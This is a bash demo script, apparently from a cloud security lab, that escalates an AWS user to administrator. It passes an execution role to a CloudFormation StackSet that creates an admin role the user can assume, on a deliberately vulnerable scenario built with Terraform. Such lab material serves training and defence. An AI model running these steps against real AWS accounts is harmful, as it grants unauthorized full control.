#!/bin/bash

# Demo script for iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances privilege escalation
# This script demonstrates how a user with PassRole and CreateStackSet can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-cloudformation-003-to-admin-starting-user"
EXECUTION_ROLE="pl-prod-cloudformation-003-to-admin-execution-role"
ADMIN_ROLE="pl-prod-cloudformation-003-to-admin-admin-role"
STACKSET_NAME="pl-prod-cloudformation-003-escalation-stackset"
ESCALATED_ROLE_NAME="pl-prod-cloudformation-003-to-admin-escalated-role"
TEMPLATE_FILE="/tmp/cfn-stackset-escalation-template.yaml"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + CloudFormation StackSet Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_cloudformation_003_iam_passrole_cloudformation_createstackset_cloudformation_createstackinstances.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user identity${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create CloudFormation StackSet template
echo -e "${YELLOW}Step 5: Creating CloudFormation StackSet template for privilege escalation${NC}"
echo "This template will create a new IAM role with admin permissions that trusts our user..."

cat > $TEMPLATE_FILE << EOF
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Privilege Escalation - Creates an admin role that trusts the starting user via StackSet'

Resources:
  EscalatedRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: ${ESCALATED_ROLE_NAME}
      Description: 'Escalated role with admin permissions - created via CloudFormation StackSet PassRole attack'
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess

Outputs:
  EscalatedRoleArn:
    Description: ARN of the escalated admin role
    Value: !GetAtt EscalatedRole.Arn
  EscalatedRoleName:
    Description: Name of the escalated admin role
    Value: !Ref EscalatedRole
EOF

echo "Template created at: $TEMPLATE_FILE"
echo ""
echo -e "${BLUE}Template contents:${NC}"
cat $TEMPLATE_FILE
echo ""
echo -e "${GREEN}✓ CloudFormation StackSet template created${NC}\n"

# [EXPLOIT] Step 6: Create CloudFormation StackSet with PassRole
echo -e "${YELLOW}Step 6: Creating CloudFormation StackSet with execution role${NC}"
use_starting_creds
echo "This is the privilege escalation vector - passing the execution role to CloudFormation StackSet..."
EXECUTION_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${EXECUTION_ROLE}"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Execution role ARN: $EXECUTION_ROLE_ARN"
echo "Administration role ARN: $ADMIN_ROLE_ARN"
echo "StackSet name: $STACKSET_NAME"
echo ""

show_attack_cmd "Attacker" "aws cloudformation create-stack-set --region $AWS_REGION --stack-set-name $STACKSET_NAME --template-body file://$TEMPLATE_FILE --administration-role-arn $ADMIN_ROLE_ARN --execution-role-name $EXECUTION_ROLE --capabilities CAPABILITY_NAMED_IAM --output text"
aws cloudformation create-stack-set \
    --region $AWS_REGION \
    --stack-set-name $STACKSET_NAME \
    --template-body file://$TEMPLATE_FILE \
    --administration-role-arn $ADMIN_ROLE_ARN \
    --execution-role-name $EXECUTION_ROLE \
    --capabilities CAPABILITY_NAMED_IAM \
    --output text

echo -e "${GREEN}✓ CloudFormation StackSet creation initiated${NC}\n"

# [EXPLOIT] Step 7: Create stack instances in the current account/region
echo -e "${YELLOW}Step 7: Creating stack instances in current account and region${NC}"
use_starting_creds
echo "Deploying StackSet to account: $ACCOUNT_ID, region: $AWS_REGION"
echo ""

show_attack_cmd "Attacker" "aws cloudformation create-stack-instances --region $AWS_REGION --stack-set-name $STACKSET_NAME --accounts $ACCOUNT_ID --regions $AWS_REGION --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1 --query 'OperationId' --output text"
OPERATION_ID=$(aws cloudformation create-stack-instances \
    --region $AWS_REGION \
    --stack-set-name $STACKSET_NAME \
    --accounts $ACCOUNT_ID \
    --regions $AWS_REGION \
    --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1 \
    --query 'OperationId' \
    --output text)

echo "Operation ID: $OPERATION_ID"
echo -e "${GREEN}✓ Stack instance creation initiated${NC}\n"

# [OBSERVATION] Step 8: Wait for stack instance operation to complete
echo -e "${YELLOW}Step 8: Waiting for StackSet operation to complete${NC}"
echo "This may take 30-60 seconds..."
echo ""
use_readonly_creds

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
OPERATION_COMPLETE=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws cloudformation describe-stack-set-operation --region $AWS_REGION --stack-set-name $STACKSET_NAME --operation-id $OPERATION_ID --query 'StackSetOperation.Status' --output text"
    OPERATION_STATUS=$(aws cloudformation describe-stack-set-operation \
        --region $AWS_REGION \
        --stack-set-name $STACKSET_NAME \
        --operation-id $OPERATION_ID \
        --query 'StackSetOperation.Status' \
        --output text 2>/dev/null || echo "NOT_FOUND")

    echo "Operation status: $OPERATION_STATUS"

    if [ "$OPERATION_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ StackSet operation complete!${NC}\n"
        OPERATION_COMPLETE=true
        break
    elif [ "$OPERATION_STATUS" = "FAILED" ] || [ "$OPERATION_STATUS" = "STOPPED" ]; then
        echo -e "${RED}Error: StackSet operation failed${NC}"
        echo "Operation status: $OPERATION_STATUS"
        show_cmd "ReadOnly" "aws cloudformation describe-stack-set-operation --region $AWS_REGION --stack-set-name $STACKSET_NAME --operation-id $OPERATION_ID --output table"
        aws cloudformation describe-stack-set-operation \
            --region $AWS_REGION \
            --stack-set-name $STACKSET_NAME \
            --operation-id $OPERATION_ID \
            --output table
        exit 1
    fi

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

if [ "$OPERATION_COMPLETE" = false ]; then
    echo -e "${RED}Error: StackSet operation did not complete within timeout${NC}"
    exit 1
fi

# Step 9: Wait for IAM propagation
echo -e "${YELLOW}Step 9: Waiting for IAM propagation${NC}"
echo "Waiting 15 seconds for the escalated role to be fully available..."
sleep 15
echo -e "${GREEN}✓ IAM propagation complete${NC}\n"

# [EXPLOIT] Step 10: Assume the escalated role
echo -e "${YELLOW}Step 10: Assuming the escalated admin role${NC}"
use_starting_creds
ESCALATED_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ESCALATED_ROLE_NAME}"
echo "This role was created by CloudFormation StackSet and has administrator access..."
echo "Role ARN: $ESCALATED_ROLE_ARN"
echo ""

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $ESCALATED_ROLE_ARN \
    --role-session-name escalation-demo \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the escalated role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed escalated role${NC}\n"

# [OBSERVATION] Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created CloudFormation StackSet template defining admin role"
echo "3. Created CloudFormation StackSet with PassRole to: $EXECUTION_ROLE"
echo "4. Created stack instances in account $ACCOUNT_ID, region $AWS_REGION"
echo "5. StackSet used execution role to create: $ESCALATED_ROLE_NAME"
echo "6. Assumed escalated role: $ESCALATED_ROLE_ARN"
echo "7. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER (PassRole + CreateStackSet)"
echo -e "  → CloudFormation StackSet (using $EXECUTION_ROLE)"
echo -e "  → Creates $ESCALATED_ROLE_NAME (with AdministratorAccess)"
echo -e "  → Assume $ESCALATED_ROLE_NAME → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- CloudFormation StackSet: $STACKSET_NAME"
echo "- Stack instances in account: $ACCOUNT_ID, region: $AWS_REGION"
echo "- Escalated IAM Role: $ESCALATED_ROLE_NAME"
echo "- Template file: $TEMPLATE_FILE"

echo -e "\n${RED}⚠ Warning: The escalated role and CloudFormation StackSet still exist${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
